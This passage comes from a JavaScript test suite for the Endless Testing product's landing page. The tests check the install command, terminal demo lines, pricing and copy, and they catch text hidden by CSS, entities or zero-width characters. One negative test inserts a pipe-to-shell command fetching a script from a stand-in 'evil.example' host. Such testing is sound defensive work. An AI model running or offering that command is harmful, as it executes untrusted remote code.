  return false;
}

function hasInstallFile(text, name) {
  return new RegExp(`(?<![A-Za-z0-9_-])${name}(?![A-Za-z0-9_-])`).test(text);
}

function decodeEntities(source) {
  let cur = source;
  for (let pass = 0; pass < 4; pass++) {
    const next = cur
      .replace(/&nbsp(?:;|(?![A-Za-z0-9]))/gi, '\u00A0')
      .replace(/&(#x[0-9a-f]+|#\d+|sol|amp|percnt);?/gi, (entity) => {
        const token = entity.endsWith(';') ? entity.slice(0, -1) : entity;
        if (/^&sol$/i.test(token)) return '/';
        if (/^&amp$/i.test(token)) return '&';
        if (/^&percnt$/i.test(token)) return '%';
        if (/^&#x[0-9a-f]+$/i.test(token)) {
          const cp = parseInt(token.slice(3), 16);
          return cp <= 0x10FFFF ? String.fromCodePoint(cp) : entity;
        }
        if (/^&#\d+$/i.test(token)) {
          const cp = parseInt(token.slice(2), 10);
          return cp <= 0x10FFFF ? String.fromCodePoint(cp) : entity;
        }
        return entity;
      });
    if (next === cur) return cur;
    cur = next;
  }
  return cur;
}

function normalizePage(source) {
  return decodeEntities(source)
    .replace(/[\u00A0\u1680\u2000-\u200A\u202F\u205F\u3000]/g, ' ')
    .replace(/[\u200B-\u200D\uFEFF\u2060\u00AD]/g, '');
}

function containsNeedle(source, needle) {
  const folded = normalizePage(source).toLowerCase();
  const want = needle.toLowerCase();
  if (folded.includes(want)) return true;
  if (folded.replace(/\s+/g, ' ').includes(want)) return true;
  const visible = folded
    .replace(/<!--[\s\S]*?-->/g, '')
    .replace(/<br\b[^>]*>/gi, ' ')
    .replace(/<[^>]+>/g, '');
  if (visible.includes(want)) return true;
  return visible.replace(/\s+/g, ' ').includes(want);
}

function containsReleaseDownload(source) {
  return containsNeedle(source, 'releases/download');
}

function containsGhReleaseDownload(source) {
  return containsNeedle(source, 'gh release download');
}

function concealedAttrs(attrs) {
  if (/(?:^|\s)hidden(?:\s|=|$)/i.test(attrs)) return true;
  const style = attrs.match(/\bstyle\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'>]+))/i);
  const value = style ? (style[1] ?? style[2] ?? style[3] ?? '') : '';
  if (/display\s*:\s*none\b/i.test(value)) return true;
  if (/visibility\s*:\s*hidden\b/i.test(value)) return true;
  if (/opacity\s*:\s*(?:0(?:\.0+)?|\.0+)(?![0-9.])/i.test(value)) return true;
  if (/font-size\s*:\s*(?:0(?:\.0+)?|\.0+)(?![0-9.])/i.test(value)) return true;
  if (/(?<![\w-])color\s*:\s*transparent\b/i.test(value)) return true;
  if (/(?:^|[;\s])left\s*:\s*-\d{3,}px\b/i.test(value)) return true;
  if (/(?:^|[;\s])text-indent\s*:\s*-\d{3,}px\b/i.test(value)) return true;
  if (/(?<![\w-])color\s*:\s*var\(\s*--bg\s*\)/i.test(value)) return true;
  if (/transform\s*:[^;]*translate(?:X|Y|3d)?\(\s*-?\d{3,}/i.test(value)) return true;
  if (/transform\s*:[^;]*scale\(\s*(?:0(?:\.0+)?|\.0+)\s*\)/i.test(value)) return true;
  return false;
}

function stripConcealed(fragment, extraHide) {
  const openRe = /<([a-zA-Z][\w:-]*)\b([^>]*)>/g;
  let cur = fragment;
  for (let pass = 0; pass < 20; pass++) {
    openRe.lastIndex = 0;
    let next = '';
    let cursor = 0;
    let changed = false;
    let match;
    while ((match = openRe.exec(cur))) {
      if (!concealedAttrs(match[2]) && !(extraHide && extraHide(match[1], match[2]))) continue;
      const closeRe = new RegExp(`<(/?)${match[1]}\\b[^>]*>`, 'gi');
      closeRe.lastIndex = openRe.lastIndex;
      let depth = 1;
      let close = -1;
      let end;
      while ((end = closeRe.exec(cur))) {
        depth += end[1] === '/' ? -1 : 1;
        if (depth === 0) {
          close = closeRe.lastIndex;
          break;
        }
      }
      if (close < 0) continue;
      next += cur.slice(cursor, match.index);
      cursor = close;
      openRe.lastIndex = close;
      changed = true;
    }
    if (!changed) return cur;
    cur = next + cur.slice(cursor);
  }
  return cur;
}

function installFragment(source) {
  const clean = source.replace(/<!--[\s\S]*?-->/g, '');
  const open = /<div\b[^>]*\bid="terminal"[^>]*>/.exec(clean);
  assert.ok(open, 'install files missing beside the terminal');
  let depth = 1;
  const tagRe = /<\/?div\b[^>]*>/g;
  tagRe.lastIndex = open.index + open[0].length;
  let match;
  while ((match = tagRe.exec(clean))) {
    depth += match[0].startsWith('</') ? -1 : 1;
    if (depth === 0) {
      const sibling = clean.slice(tagRe.lastIndex).match(/^\s*<p\b([^>]*)>([\s\S]*?)<\/p>/);
      assert.ok(sibling, 'install files missing beside the terminal');
      const attrs = sibling[1];
      if (!/\bclass="[^"]*\binstall-files\b/.test(attrs) || concealedAttrs(attrs)) {
        assert.fail('install files missing beside the terminal');
      }
      return sibling[2];
    }
  }
  assert.fail('install files missing beside the terminal');
}

function installParagraph(source) {
  return normalizePage(stripConcealed(installFragment(source)).replace(/<[^>]+>/g, ''));
}

function installCommand(source) {
  const fragment = stripConcealed(installFragment(source));
  const code = fragment.match(/<code\b([^>]*)>([\s\S]*?)<\/code>/i);
  if (!code || concealedAttrs(code[1])) assert.fail('curl install line missing');
  return normalizePage(stripConcealed(code[2]).replace(/<[^>]+>/g, '')).trim();
}

const CURL_INSTALL_LINE = 'curl -fsSL https://api.endlesstesting.ai/install.sh | sh';

function assertInstallFiles(source) {
  if (asksForGitHubLogin(source)) assert.fail('command needs a GitHub login');
  if (containsReleaseDownload(source)) assert.fail('page contains releases/download');
  if (containsGhReleaseDownload(source)) assert.fail('gh release download remains');
  const text = installParagraph(source);
  if (installCommand(source) !== CURL_INSTALL_LINE) assert.fail('curl install line missing');
  for (const name of INSTALL_FILES) {
    if (!hasInstallFile(text, name)) assert.fail(`install file missing: ${name}`);
  }
  if (!/The script picks the file for this machine\./.test(text)) {
    assert.fail('install files missing the machine sentence');
  }
}

test('the page names the five et install files beside the terminal', () => {
  assertInstallFiles(html);
  for (const name of INSTALL_FILES) {
    const stripped = html.replaceAll(name, 'et-missing');
    assert.notEqual(stripped, html, name);
    assert.throws(() => assertInstallFiles(stripped), new RegExp(`install file missing: ${name}`), name);
    const longer = html.replaceAll(name, `${name}-extra`);
    assert.notEqual(longer, html, `${name} longer`);
    assert.throws(() => assertInstallFiles(longer), new RegExp(`install file missing: ${name}`), `${name} longer`);
  }

  const hiddenName = html.replace('et-x86_64-windows', '<span hidden>et-x86_64-windows</span>');
  assert.notEqual(hiddenName, html);
  assert.throws(() => assertInstallFiles(hiddenName), /install file missing: et-x86_64-windows/);

  const hiddenSentence = html.replace(
    'The script picks the file for this machine.',
    '<span hidden>The script picks the file for this machine.</span>',
  );
  assert.notEqual(hiddenSentence, html);
  assert.throws(() => assertInstallFiles(hiddenSentence), /machine sentence/);

  const paragraph = html.match(/<p class="install-files">[\s\S]*?<\/p>/)[0];
  const moved = html.replace(paragraph, '').replace('</body>', `${paragraph}</body>`);
  assert.notEqual(moved, html);
  assert.throws(() => assertInstallFiles(moved), /install files missing beside the terminal/);

  const noSentence = html.replace('The script picks the file for this machine.', 'Pick a file.');
  assert.notEqual(noSentence, html);
  assert.throws(() => assertInstallFiles(noSentence), /machine sentence/);

  const gh = html.replace('> et login', '> gh auth login');
  assert.notEqual(gh, html);
  assert.throws(() => assertInstallFiles(gh), /GitHub login/);
  assert.throws(() => assertInstallFiles(`${html}\nGITHUB_TOKEN`), /GitHub login/);
  assert.throws(() => assertInstallFiles(`${html}\nGH_TOKEN`), /GitHub login/);

  const noCmd = html.replace(CURL_INSTALL_LINE, 'curl -O et-x86_64-linux-musl');
  assert.notEqual(noCmd, html);
  assert.throws(() => assertInstallFiles(noCmd), /curl install line missing/);

  const hiddenCmd = html.replace(
    CURL_INSTALL_LINE,
    `<span hidden>${CURL_INSTALL_LINE}</span>`,
  );
  assert.notEqual(hiddenCmd, html);
  assert.throws(() => assertInstallFiles(hiddenCmd), /curl install line missing/);

  const leaked = html.replace('</body>', '<!-- releases/download --></body>');
  assert.notEqual(leaked, html);
  assert.throws(() => assertInstallFiles(leaked), /page contains releases\/download/);

  const urlLine = html.replace(
    CURL_INSTALL_LINE,
    'https://github.com/valentinyeo/endless-testing/releases/download/et/et-x86_64-linux-musl',
  );
  assert.notEqual(urlLine, html);
  assert.throws(() => assertInstallFiles(urlLine), /page contains releases\/download/);

  const oldCmd = html.replace(
    CURL_INSTALL_LINE,
    'gh release download et --repo valentinyeo/endless-testing --pattern et-x86_64-linux-musl',
  );
  assert.notEqual(oldCmd, html);
  assert.throws(() => assertInstallFiles(oldCmd), /gh release download remains/);

  const keptCmd = html.replace('</body>', 'gh release download</body>');
  assert.notEqual(keptCmd, html);
  assert.throws(() => assertInstallFiles(keptCmd), /gh release download remains/);

  const hiddenCmdCase = html.replace(
    CURL_INSTALL_LINE,
    `<span Hidden>${CURL_INSTALL_LINE}</span>`,
  );
  assert.notEqual(hiddenCmdCase, html);
  assert.throws(() => assertInstallFiles(hiddenCmdCase), /curl install line missing/);

  const hiddenParagraph = html.replace('<p class="install-files">', '<p Hidden class="install-files">');
  assert.notEqual(hiddenParagraph, html);
  assert.throws(() => assertInstallFiles(hiddenParagraph), /install files missing beside the terminal/);

  const noneCmd = html.replace(
    `<code>${CURL_INSTALL_LINE}</code>`,
    `<code style="display:none">${CURL_INSTALL_LINE}</code>`,
  );
  assert.notEqual(noneCmd, html);
  assert.throws(() => assertInstallFiles(noneCmd), /curl install line missing/);

  const wrongHost = html.replace('https://api.endlesstesting.ai/install.sh', 'https://api.endlesstesting.ai/install.txt');
  assert.notEqual(wrongHost, html);
  assert.throws(() => assertInstallFiles(wrongHost), /curl install line missing/);

  const entityUrl = html.replace('</body>', '<!-- releases&#47;download --></body>');
  assert.notEqual(entityUrl, html);
  assert.throws(() => assertInstallFiles(entityUrl), /page contains releases\/download/);

  const namedUrl = html.replace('</body>', 'releases&sol;download</body>');
  assert.notEqual(namedUrl, html);
  assert.throws(() => assertInstallFiles(namedUrl), /page contains releases\/download/);

  const splitUrl = html.replace('</body>', '<p>releases/<span>download</span></p></body>');
  assert.notEqual(splitUrl, html);
  assert.throws(() => assertInstallFiles(splitUrl), /page contains releases\/download/);

  const zwUrl = html.replace('</body>', 'releases/\u200bdownload</body>');
  assert.notEqual(zwUrl, html);
  assert.throws(() => assertInstallFiles(zwUrl), /page contains releases\/download/);

  const nbspGh = html.replace('</body>', 'gh&nbsp;release&nbsp;download</body>');
  assert.notEqual(nbspGh, html);
  assert.throws(() => assertInstallFiles(nbspGh), /gh release download remains/);

  const numNbspGh = html.replace('</body>', 'gh&#160;release&#160;download</body>');
  assert.notEqual(numNbspGh, html);
  assert.throws(() => assertInstallFiles(numNbspGh), /gh release download remains/);

  const hexNbspGh = html.replace('</body>', 'gh&#xa0;release&#xa0;download</body>');
  assert.notEqual(hexNbspGh, html);
  assert.throws(() => assertInstallFiles(hexNbspGh), /gh release download remains/);

  const literalNbspGh = html.replace('</body>', 'gh\u00A0release\u00A0download</body>');
  assert.notEqual(literalNbspGh, html);
  assert.throws(() => assertInstallFiles(literalNbspGh), /gh release download remains/);

  const ampNbspGh = html.replace('</body>', 'gh&amp;nbsp;release&amp;nbsp;download</body>');
  assert.notEqual(ampNbspGh, html);
  assert.throws(() => assertInstallFiles(ampNbspGh), /gh release download remains/);

  const ampSol = html.replace('</body>', 'releases&amp;sol;download</body>');
  assert.notEqual(ampSol, html);
  assert.throws(() => assertInstallFiles(ampSol), /page contains releases\/download/);

  const upperGh = html.replace('</body>', 'GH release download</body>');
  assert.notEqual(upperGh, html);
  assert.throws(() => assertInstallFiles(upperGh), /gh release download remains/);

  const spacedGh = html.replace('</body>', 'gh  release  download</body>');
  assert.notEqual(spacedGh, html);
  assert.throws(() => assertInstallFiles(spacedGh), /gh release download remains/);

  const tabGh = html.replace('</body>', 'gh\trelease\tdownload</body>');
  assert.notEqual(tabGh, html);
  assert.throws(() => assertInstallFiles(tabGh), /gh release download remains/);

  const newlineGh = html.replace('</body>', '<!-- gh\nrelease download --></body>');
  assert.notEqual(newlineGh, html);
  assert.throws(() => assertInstallFiles(newlineGh), /gh release download remains/);

  const brGh = html.replace('</body>', '<p>gh<br>release download</p></body>');
  assert.notEqual(brGh, html);
  assert.throws(() => assertInstallFiles(brGh), /gh release download remains/);

  const upperUrl = html.replace('</body>', 'Releases/Download</body>');
  assert.notEqual(upperUrl, html);
  assert.throws(() => assertInstallFiles(upperUrl), /page contains releases\/download/);

  const commentSplit = html.replace('</body>', 'releases/<!-- > -->download</body>');
  assert.notEqual(commentSplit, html);
  assert.throws(() => assertInstallFiles(commentSplit), /page contains releases\/download/);

  const suffix = html.replace(CURL_INSTALL_LINE, `${CURL_INSTALL_LINE} --help`);
  assert.notEqual(suffix, html);
  assert.throws(() => assertInstallFiles(suffix), /curl install line missing/);

  const wrongCode = html.replace(
    `<code>${CURL_INSTALL_LINE}</code>`,
    `<code>curl -fsSL https://evil.example/install.sh | sh</code> ${CURL_INSTALL_LINE}`,
  );
  assert.notEqual(wrongCode, html);
  assert.throws(() => assertInstallFiles(wrongCode), /curl install line missing/);

  const opacityCmd = html.replace(
    `<code>${CURL_INSTALL_LINE}</code>`,
    `<code style="opacity:0">${CURL_INSTALL_LINE}</code>`,
  );
  assert.notEqual(opacityCmd, html);
  assert.throws(() => assertInstallFiles(opacityCmd), /curl install line missing/);

  const tinyCmd = html.replace(
    `<code>${CURL_INSTALL_LINE}</code>`,
    `<code style="font-size:0">${CURL_INSTALL_LINE}</code>`,
  );
  assert.notEqual(tinyCmd, html);
  assert.throws(() => assertInstallFiles(tinyCmd), /curl install line missing/);

  const clearCmd = html.replace(
    `<code>${CURL_INSTALL_LINE}</code>`,
    `<code style="color:transparent">${CURL_INSTALL_LINE}</code>`,
  );
  assert.notEqual(clearCmd, html);
  assert.throws(() => assertInstallFiles(clearCmd), /curl install line missing/);

  const offscreenCmd = html.replace(
    `<code>${CURL_INSTALL_LINE}</code>`,
    `<code style="position:absolute;left:-9999px">${CURL_INSTALL_LINE}</code>`,
  );
  assert.notEqual(offscreenCmd, html);
  assert.throws(() => assertInstallFiles(offscreenCmd), /curl install line missing/);

  const fadedName = html.replace(
    'et-x86_64-macos',
    '<span style="opacity:0">et-x86_64-macos</span>',
  );
  assert.notEqual(fadedName, html);
  assert.throws(() => assertInstallFiles(fadedName), /install file missing: et-x86_64-macos/);
});

test('the page does not ask for an OpenRouter key', () => {
  assertNoOpenRouterKey(html);
  assert.throws(() => assertNoOpenRouterKey('Paste your OpenRouter key'), /OpenRouter key/);
  assert.throws(() => assertNoOpenRouterKey('Add your OpenRouter API key'), /OpenRouter key/);
  assert.throws(() => assertNoOpenRouterKey('Paste your API key from OpenRouter'), /OpenRouter key/);
  assert.throws(() => assertNoOpenRouterKey('Enter your key for OpenRouter'), /OpenRouter key/);
  assert.throws(() => assertNoOpenRouterKey('API key (OpenRouter)'), /OpenRouter key/);
  assert.throws(() => assertNoOpenRouterKey('Go to OpenRouter, create an account, open settings, and copy the API key.'), /OpenRouter key/);
  assert.throws(() => assertNoOpenRouterKey('OPENROUTER_API_KEY'), /OpenRouter key/);
  assert.throws(() => assertNoOpenRouterKey('OPENROUTER_KEY'), /OpenRouter key/);
  assertNoOpenRouterKey('Traffic is not sent to OpenRouter.');
  assertNoOpenRouterKey('OpenRouter keyboard');
  const far = `Traffic is not sent to OpenRouter.${' '.repeat(400)}if (event.key === 'Escape') closeMenu();`;
  assertNoOpenRouterKey(far);
});

test('terminal login line is et login --email or et login --code', () => {
  assertTerminalLogin(html);
  const bare = html.replace('> et login --email', '> et login');
  assert.notEqual(bare, html);
  assert.throws(() => assertTerminalLogin(bare), /--email or --code/);
  const coded = html.replace('> et login --email', '> et login --code');
  assert.notEqual(coded, html);
  assertTerminalLogin(coded);
  const token = html.replace('> et login --email', '> et login --token');
  assert.notEqual(token, html);
  assert.throws(() => assertTerminalLogin(token), /--email or --code/);
  const dropped = html.replace('> et login --email\n', '>\n');
  assert.notEqual(dropped, html);
  assert.throws(() => assertTerminalLogin(dropped), /terminal login line missing/);

  const visibleSpan = html.replace('et login --email', 'et login <span>--email</span>');
  assert.notEqual(visibleSpan, html);
  assertTerminalLogin(visibleSpan);

  const extras = [
    ['double space', 'et login --email\n<span class="prompt">$</span> et  login\n'],
    ['tab', 'et login --email\n<span class="prompt">$</span> et\tlogin\n'],
    ['capital', 'et login --email\n<span class="prompt">$</span> Et login\n'],
  ];
  for (const [name, sample] of extras) {
    const extra = html.replace('et login --email\n', sample);
    assert.notEqual(extra, html, name);
    assert.throws(() => assertTerminalLogin(extra), /--email or --code/, name);
  }

  const disguised = [
    ['double space only', 'et  login'],
    ['capital only', 'Et login'],
    ['tab only', 'et\tlogin'],
    ['nbsp', 'et&nbsp;login&nbsp;--email'],
    ['zero width', 'et login --em\u200Bail'],
    ['hidden flag', 'et login <span hidden>--email</span>'],
    ['opacity', 'et login <span style="opacity:.0">--email</span>'],
    ['font size', 'et login <span style="font-size:.0">--email</span>'],
    ['scale', 'et login <span style="transform:scale(.0)">--email</span>'],
    ['code color', 'et login <span style="color:var(--code)">--email</span>'],
    ['light hex', 'et login <span style="color:#121612">--email</span>'],
    ['dark hex', 'et login <span style="color:#1a211c">--email</span>'],
  ];
  for (const [name, sample] of disguised) {
    const broken = html.replace('et login --email', sample);
    assert.notEqual(broken, html, name);
    assert.throws(() => assertTerminalLogin(broken), /--email or --code/, name);
  }

  const codeRule = '.terminal code { display: block; white-space: pre-wrap; }';
  for (const [name, decl] of [
    ['nested display', 'display: none'],
    ['nested paint', 'color: var(--code)'],
  ]) {
    const nested = html
      .replace(codeRule, `${codeRule}\n        .terminal code .gone { ${decl}; }`)
      .replace('et login --email', 'et login <span class="gone">--email</span>');
    assert.notEqual(nested, html, name);
    assert.throws(() => assertTerminalLogin(nested), /--email or --code/, name);
  }
});

test('et status prints decision: continue and does not name Clear price', () => {
  assertStatusContinues(html);

  const winner = html.replace(
    '<span class="dim">decision: continue</span>',
    '<span class="dim">winner: Clear price</span>',
  );
  assert.notEqual(winner, html);
  assert.throws(() => assertStatusContinues(winner), /winner: Clear price is in the terminal/);

  const both = html.replace(
    '<span class="dim">decision: continue</span>',
    '<span class="dim">decision: continue</span>\n<span class="dim">winner: Clear price</span>',
  );
  assert.notEqual(both, html);
  assert.throws(() => assertStatusContinues(both), /winner: Clear price is in the terminal/);

  const hiddenWinner = html.replace(
    '<span class="dim">decision: continue</span>',
    '<span class="dim">decision: continue</span><span hidden>winner: Clear price</span>',
  );
  assert.notEqual(hiddenWinner, html);
  assert.throws(() => assertStatusContinues(hiddenWinner), /winner: Clear price is in the terminal/);

  const dropped = html.replace(
    '<span class="dim">decision: continue</span>',
    '<span class="dim">round: 2</span>',
  );
  assert.notEqual(dropped, html);
  assert.throws(() => assertStatusContinues(dropped), /decision: continue missing from terminal/);

  const outside = html
    .replace('<span class="dim">decision: continue</span>', '<span class="dim">round: 2</span>')
    .replace('</body>', '<p>decision: continue</p></body>');
  assert.throws(() => assertStatusContinues(outside), /decision: continue missing from terminal/);

  const commented = html.replace(
    '<span class="dim">decision: continue</span>',
    '<!-- decision: continue -->',
  );
  assert.notEqual(commented, html);
  assert.throws(() => assertStatusContinues(commented), /decision: continue missing from terminal/);

  const hidden = html.replace('<span class="dim">decision: continue</span>', '<span class="dim" hidden>decision: continue</span>');
  assert.notEqual(hidden, html);
  assert.throws(() => assertStatusContinues(hidden), /decision: continue missing from terminal/);

  const before = html.replace(
    '<span class="prompt">$</span> et status\n<span class="dim">decision: continue</span>',
    '<span class="dim">decision: continue</span>\n<span class="prompt">$</span> et status',
  );
  assert.notEqual(before, html);
  assert.throws(() => assertStatusContinues(before), /decision: continue missing from terminal/);

  const encodedDecision = html.replace(
    '<span class="dim">decision: continue</span>',
    '<span class="dim">decision:&nbsp;continue</span>',
  );
  assert.notEqual(encodedDecision, html);
  assertStatusContinues(encodedDecision);

  const splitDecision = html.replace(
    '<span class="dim">decision: continue</span>',
    '<span class="dim">decision:</span> continue',
  );
  assert.notEqual(splitDecision, html);
  assertStatusContinues(splitDecision);

  const brokenLine = html.replace(
    '<span class="prompt">$</span> et status\n<span class="dim">decision: continue</span>',
    '<span class="prompt">$</span> et status<br><span class="dim">decision: continue</span>',
  );
  assert.notEqual(brokenLine, html);
  assertStatusContinues(brokenLine);

  const winnerForms = [
    ['nbsp', '<span class="dim">winner: Clear&nbsp;price</span>'],
    ['numeric space', '<span class="dim">winner: Clear&#32;price</span>'],
    ['hex nbsp', '<span class="dim">winner: Clear&#xa0;price</span>'],
    ['double encoded', '<span class="dim">winner: Clear&amp;nbsp;price</span>'],
    ['split tag', '<span class="dim">winner: Clear</span> price'],
    ['zero width', '<span class="dim">winner: Clear\u200b price</span>'],
    ['double space', '<span class="dim">winner:  Clear price</span>'],
    ['capital', '<span class="dim">Winner: Clear price</span>'],
  ];
  for (const [name, sample] of winnerForms) {
    const encoded = html.replace(
      '<span class="dim">decision: continue</span>',
      `<span class="dim">decision: continue</span>\n${sample}`,
    );
    assert.notEqual(encoded, html, name);
    assert.throws(() => assertStatusContinues(encoded), /winner: Clear price is in the terminal/, name);
  }

  const afterCode = html.replace(
    '<span class="dim">decision: continue</span></code>',
    '<span class="dim">decision: continue</span></code><span>winner: Clear price</span>',
  );
  assert.notEqual(afterCode, html);
  assert.throws(() => assertStatusContinues(afterCode), /winner: Clear price is in the terminal/);

  const commentedWinner = html.replace(
    '<span class="dim">decision: continue</span>',
    '<span class="dim">decision: continue</span><!-- winner: Clear price -->',
  );
  assert.notEqual(commentedWinner, html);
  assert.throws(() => assertStatusContinues(commentedWinner), /winner: Clear price is in the terminal/);

  const concealedDecision = [
    ['display none', '<span class="dim" style="display:none">decision: continue</span>'],
    ['visibility', '<span class="dim" style="visibility:hidden">decision: continue</span>'],
    ['opacity', '<span class="dim" style="opacity:0">decision: continue</span>'],
    ['Hidden', '<span class="dim" Hidden>decision: continue</span>'],
    ['script', '<script>decision: continue</script>'],
    ['template', '<template>decision: continue</template>'],
  ];
  for (const [name, sample] of concealedDecision) {
    const concealed = html.replace('<span class="dim">decision: continue</span>', sample);
    assert.notEqual(concealed, html, name);
    assert.throws(() => assertStatusContinues(concealed), /decision: continue missing from terminal/, name);
  }

  const dimRule = html.replace(
    '.dim { color: var(--code-dim); }',
    '.dim { color: var(--code-dim); display: none; }',
  );
  assert.notEqual(dimRule, html);
  assert.throws(() => assertStatusContinues(dimRule), /decision: continue missing from terminal/);

  const hiddenTerminal = html.replace('.terminal {', '.terminal { display: none;');
  assert.notEqual(hiddenTerminal, html);
  assert.throws(() => assertStatusContinues(hiddenTerminal), /decision: continue missing from terminal/);
});

test('a still-running round prints decision: continue and names no winner', () => {
  assertStillRunningSentence(html);
  assert.equal(claimsLiveRoundWinner(STILL_RUNNING_SENTENCE), false);

  const missing = html.replace(STILL_RUNNING_SENTENCE, 'A finished round names a winner.');
  assert.notEqual(missing, html);
  assert.throws(() => assertStillRunningSentence(missing), /still-running sentence missing/);

  const commented = html.replace(STILL_RUNNING_SENTENCE, `<!-- ${STILL_RUNNING_SENTENCE} -->`);
  assert.notEqual(commented, html);
  assert.throws(() => assertStillRunningSentence(commented), /still-running sentence missing/);

  const hidden = html.replace('<p id="still-running"', '<p id="still-running" hidden');
  assert.notEqual(hidden, html);
  assert.throws(() => assertStillRunningSentence(hidden), /still-running sentence missing/);

  const none = html.replace('<p id="still-running"', '<p id="still-running" style="display:none"');
  assert.notEqual(none, html);
  assert.throws(() => assertStillRunningSentence(none), /still-running sentence missing/);

  const classHide = html.replace(
    '.still-running { margin-top: 0.75rem; color: var(--muted); font-size: 0.92rem; }',
    '.still-running { margin-top: 0.75rem; color: var(--muted); font-size: 0.92rem; display: none; }',
  );
  assert.notEqual(classHide, html);
  assert.throws(() => assertStillRunningSentence(classHide), /still-running sentence missing/);

  const moved = html.replace(/<p id="still-running"[\s\S]*?<\/p>/, '');
  assert.notEqual(moved, html);
  const parked = moved.replace('</body>', `<p id="still-running" class="still-running">${STILL_RUNNING_SENTENCE}</p></body>`);
  assert.throws(() => assertStillRunningSentence(parked), /still-running sentence missing/);

  const droppedDecision = html.replace('<span class="dim">decision: continue</span>', '<span class="dim">round: 2</span>');
  assert.notEqual(droppedDecision, html);
  assert.throws(() => assertStillRunningSentence(droppedDecision), /decision: continue missing from terminal/);

  const winnerInTerminal = html.replace('<span class="dim">decision: continue</span>', '<span class="dim">winner: Clear price</span>');
  assert.notEqual(winnerInTerminal, html);
  assert.throws(() => assertStillRunningSentence(winnerInTerminal), /winner: Clear price is in the terminal/);

  const outsideWinner = html.replace('</body>', '<p>winner: Clear price</p></body>');
  assert.notEqual(outsideWinner, html);
  assertStillRunningSentence(outsideWinner);

  const homeClaim = html.replace(STILL_RUNNING_SENTENCE, `${STILL_RUNNING_SENTENCE} The homepage round has a winner.`);
  assert.notEqual(homeClaim, html);
  assert.throws(() => assertStillRunningSentence(homeClaim), /claims a live round winner/);

  const siteClaim = html.replace(STILL_RUNNING_SENTENCE, `${STILL_RUNNING_SENTENCE} valentinyeo.com has a winner.`);
  assert.notEqual(siteClaim, html);
  assert.throws(() => assertStillRunningSentence(siteClaim), /claims a live round winner/);

  const stillP = `<p id="still-running" class="still-running">${STILL_RUNNING_SENTENCE}</p>`;
  for (const [name, wrapper] of [
    ['script', (inner) => `<script>${inner}</script>`],
    ['style', (inner) => `<style>${inner}</style>`],
    ['template', (inner) => `<template><p>${inner}</p></template>`],
    ['noscript', (inner) => `<noscript><p>${inner}</p></noscript>`],
  ]) {
    const only = html.replace(stillP, wrapper(STILL_RUNNING_SENTENCE));
    assert.notEqual(only, html, name);
    assert.throws(() => assertStillRunningSentence(only), /still-running sentence missing/, name);
  }

  const cut = html.replace(
    stillP,
    `${stillP}<script>\nvar x = '</section>';\n</script><p>The homepage round has a winner.</p>`,
  );
  assert.notEqual(cut, html);
  assert.throws(() => assertStillRunningSentence(cut), /claims a live round winner/);

  const claims = [
    'The homepage round is a winner.',
    'valentinyeo.com is a winner.',
    'valentinyeo.com has the winner.',
    'The winner of the homepage round is Clear price.',
    'endlesstesting-100 got a winner.',
    'The homepage has the winner.',
    'We called a winner for valentinyeo.com.',
    'The winner for endlesstesting-100 is Clear price.',
    "The homepage round's winner is Clear price.",
  ];
  for (const claim of claims) {
    const claimed = html.replace(STILL_RUNNING_SENTENCE, `${STILL_RUNNING_SENTENCE} ${claim}`);
    assert.notEqual(claimed, html, claim);
    assert.throws(() => assertStillRunningSentence(claimed), /claims a live round winner/, claim);
  }

  const denial = html.replace(STILL_RUNNING_SENTENCE, `${STILL_RUNNING_SENTENCE} The homepage round has no winner. valentinyeo.com is not a winner.`);
  assert.notEqual(denial, html);
  assertStillRunningSentence(denial);

  const bgColor = html.replace(
    '.still-running { margin-top: 0.75rem; color: var(--muted); font-size: 0.92rem; }',
    '.still-running { margin-top: 0.75rem; color: var(--bg); font-size: 0.92rem; }',
  );
  assert.notEqual(bgColor, html);
  assert.throws(() => assertStillRunningSentence(bgColor), /still-running sentence missing/);

  const shifted = html.replace(
    '.still-running { margin-top: 0.75rem; color: var(--muted); font-size: 0.92rem; }',
    '.still-running { margin-top: 0.75rem; color: var(--muted); font-size: 0.92rem; transform: translateX(-9999px); }',
  );
  assert.notEqual(shifted, html);
  assert.throws(() => assertStillRunningSentence(shifted), /still-running sentence missing/);

  const scaled = html.replace(
    '.still-running { margin-top: 0.75rem; color: var(--muted); font-size: 0.92rem; }',
    '.still-running { margin-top: 0.75rem; color: var(--muted); font-size: 0.92rem; transform: scale(0); }',
  );
  assert.notEqual(scaled, html);
  assert.throws(() => assertStillRunningSentence(scaled), /still-running sentence missing/);
});

test('you connect Claude, Codex, or ChatGPT and the product writes the next lines', () => {
  assertLinesSection(html);
  const stripped = html.replace(/<section id="lines">[\s\S]*?<\/section>/, '');
  assert.notEqual(stripped, html);
  assert.throws(() => assertLinesSection(stripped), /lines section missing/);
  const noConnect = html.replace('You connect Claude, Codex, or ChatGPT.', 'You bring a model.');
  assert.notEqual(noConnect, html);
  assert.throws(() => assertLinesSection(noConnect), /Claude, Codex, or ChatGPT/);
  const noLines = html.replace('Endless Testing writes the next lines.', 'Endless Testing stores the round.');
  assert.notEqual(noLines, html);
  assert.throws(() => assertLinesSection(noLines), /writes the next lines/);
});

test('landing copy has the required facts and no em dashes', () => {
  assert.equal(html.includes('\u2014'), false);
  assert.equal(html.includes('\u2013'), false);
  assert.match(html, /id="primary-cta"[^>]*href="https:\/\/dash\.endlesstesting\.ai\/"/);
  assert.match(html, /et login/);
  assert.match(html, /et site add/);
  assert.match(html, /et round start/);
  assert.match(html, /et status/);
  assert.match(html, /The winner stays live/);
  assert.match(html, /The next round starts itself/);
  assert.match(html, /CLI, MCP, and API are equal/);
  assert.match(html, /The kill switch stops the round/);
  assert.match(html, /id="price-amount">\$299</);
  assert.match(html, /\$249\/mo/);
  assert.match(html, /7-day free trial/);
  assert.match(html, /id="dogfood-note">This page runs the Endless Testing SDK\./);
  assert.match(html, /src="https:\/\/api\.endlesstesting\.ai\/api\/sdk\.js" async data-cfasync="false"/);
  assert.match(html, /base: "https:\/\/api\.endlesstesting\.ai"/);
  const billed = html.match(/Billed annually at <strong>\$([\d,]+)\/yr<\/strong>/);
  assert.ok(billed, 'annual total missing from billing script');
  assert.equal(Number(billed[1].replaceAll(',', '')), 249 * 12);
  const save = html.match(/Save \$(\d+)\/yr/);
  assert.ok(save, 'annual savings missing from billing script');
  assert.equal(Number(save[1]), (299 - 249) * 12);
  assert.match(html, /rel="icon" href="\/images\/icon\.png"/);
  assert.equal(fs.existsSync(path.join(root, 'images/icon.png')), true);
});

test('dogfood note names the two live rounds', () => {
  assertDogfoodRounds(html);
